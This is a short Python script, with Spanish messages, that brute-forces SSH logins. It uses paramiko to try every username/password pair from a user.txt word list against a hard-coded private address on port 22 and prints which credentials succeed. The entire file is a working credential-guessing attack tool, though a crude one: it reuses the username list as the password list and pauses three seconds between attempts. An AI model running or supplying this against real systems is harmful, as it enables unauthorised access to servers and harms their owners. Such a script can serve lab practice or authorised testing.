import paramiko
import time

def brute(host, puerto, usuario, password):
    logDoc = paramiko.util.log_to_file('log.log')
    cliente = paramiko.SSHClient()
    cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        cliente.connect(host, port=puerto, username=usuario, password=password)
        print(f"Se autentico al usuario: {usuario}")
    except :
        print(f"Fallo la autenticacion con el usuario {usuario}")
def main():
    ip = "192.168.8.6"
    puerto = 22
    users = open('user.txt', 'r')
    users = users.read().split('\n')
    passwords = users
    for user in users:
        for password in passwords:
            time.sleep(3)
            brute(ip,puerto, user, password)
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()